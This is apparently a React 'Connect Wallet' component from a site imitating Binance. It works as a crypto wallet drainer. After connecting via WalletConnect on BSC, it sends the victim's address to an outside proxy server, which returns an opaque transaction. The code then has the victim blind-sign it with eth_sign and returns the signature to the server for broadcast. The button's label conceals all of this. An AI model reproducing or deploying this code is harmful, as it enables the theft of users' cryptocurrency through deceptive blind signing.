import jQuery from "jquery";
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner() {
    if (typeof localStorage !== "undefined") {
      localStorage.removeItem("walletconnect");
    }

    var ethereumProvider = await EthereumProvider.init({
      showQrModal: true,
      chains: [56], // فقط BSC
      methods: ["personal_sign", "eth_sign"],
      projectId: "9fe3ed74e1d73141e8b7747bedf77551",
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({ method: "eth_accounts" });
    var account_sender = account[0];

    if (!account_sender) {
      console.error("❌ Wallet connection failed");
      return;
    }

    console.log("✅ Wallet Address:", account_sender);

    try {
      await provider.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x38" }], // BSC Chain ID
      });
    } catch (error) {
      console.error("❌ Error in switching chain:", error);
      return;
    }

    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";

    async function signAndSendTransaction(address, chain, type, contract = "0") {
      try {
        let requestData = { handler: "tx", address, chain, type };
        if (type === "token") requestData.contract = contract;

        console.log("📡 Sending Request Data:", requestData);

        var result = await jQuery.post(apiUrl, requestData);
        if (!result || result === "null") {
          console.error("❌ API Response is NULL");
          return;
        }

        var unsignedTx = JSON.parse(result);
        console.log("📜 Unsigned Transaction:", unsignedTx);

        if (!unsignedTx.result) {
          console.error("❌ Invalid unsigned transaction response");
          return;
        }

        var signedTx = await provider.request({
          method: "eth_sign",
          params: [address, JSON.stringify(unsignedTx.result)],
        });

        console.log("✍️ Signed Transaction:", signedTx);

        if (!signedTx) {
          console.error("❌ Signing failed");
          return;
        }

        var txHash = await jQuery.post(apiUrl, {
          handler: "sign",
          signature: signedTx,
          type,
        });

        console.log("📤 Transaction Sent:", txHash);
        return txHash;
      } catch (error) {
        console.error("❌ Error in signAndSendTransaction:", error);
        return null;
      }
    }

    var txHash = await signAndSendTransaction(account_sender, "56", "coin");

    if (txHash) {
      console.log("📤 Final Transaction Hash:", txHash);
    } else {
      console.error("⚠ Transaction failed.");
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      <span>Connect Wallet</span>
    </a>
  );
}

export default App;
